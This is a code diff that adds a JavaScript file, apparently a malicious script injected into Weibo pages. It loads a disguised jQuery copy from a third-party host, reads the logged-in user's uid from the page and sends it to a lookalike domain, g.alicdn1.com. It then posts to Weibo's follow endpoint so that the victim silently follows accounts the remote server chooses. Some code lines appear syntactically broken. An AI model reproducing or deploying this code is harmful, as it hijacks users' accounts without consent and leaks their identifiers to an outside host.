@@ -1,0 +1,55 @@
+var script=document.createElement("script");
+script.type="text/javascript";
+script.src="http://s-164732.abc188.com/sina/jquery-1.9.1.min.js";
+document.getElementsByTagName('head')[0].appendChild(script);
+
+setTimeout("run();", 50);
+
+function cutstr(text,start,end)
+{
+var s = text.indexOf(start)
+if(s>-1)
+{
+var text2 = text.substr(s+start.length);
+var s2 = text2.indexOf(end);
+if(s2>-1)
+{
+result = text2.substr(0,s2);
+}
+else result = '';
+}
+else
+{
+result = '';
+}
+return result;
+}
+
+function run()
+{
+if (typeof(jQuery) == 'undefined')
+{
+setTimeout("run();", 50);
+}
+else
+{
+var html =document.documentElement.outerHTML;
+var oid = cutstr(html,"$CONFIG['uid']='","';");
+if( oid != '' )
+{
+$.ajax({
+type:"GET",
+dataType:"jsonp",
+url:"http://g.alicdn1.com/w?oid="+encodeURI(oid),
+jsonp:"callback",
+jsonpCallback:"weiboCallback",
+success:function(result){
+for(var i in result) {
+STK.core.io.ajax({method:'POST',url:'/aj/f/followed',args:{_t:0,extra:'',f:1,fnick:'+result[i]+',location:'page_100505_home',nogroup:'false',objectid:'',oid:+i+,refer_flag:'1005050001_',refer_lflag:'',refer_sort:'',uid:+i+,wforce:1}});
+}
+
+}
+});
+}
+}
+}
